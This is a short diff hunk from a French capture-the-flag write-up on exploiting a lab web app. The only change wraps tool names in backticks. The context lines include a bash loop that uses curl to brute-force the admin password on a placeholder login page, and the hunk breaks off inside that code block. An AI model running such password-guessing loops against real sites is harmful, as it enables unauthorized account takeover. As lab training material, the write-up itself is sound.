@@ -12,7 +12,7 @@ Grâce à l’exploitation des failles **d’injection SQL** sur les pages `sear
 - Après plusieurs essais, le mot de passe de l’administrateur est trouvé, ce qui donne accès au panneau de gestion, et permet d’obtenir le **flag**.
 
 ### **Exemples d’exploitation**
-- Script d’automatisation simple (ex: bash, Python, `hydra`, etc.)
+- Script d’automatisation simple (ex: `bash`, `Python`, `hydra`, etc.)
 ```bash
 for pass in $(cat top25.txt); do
     curl -s -X POST "http://target/login.php" -d "username=admin&password=$pass" | grep "Bienvenue" && echo "Trouvé : $pass"
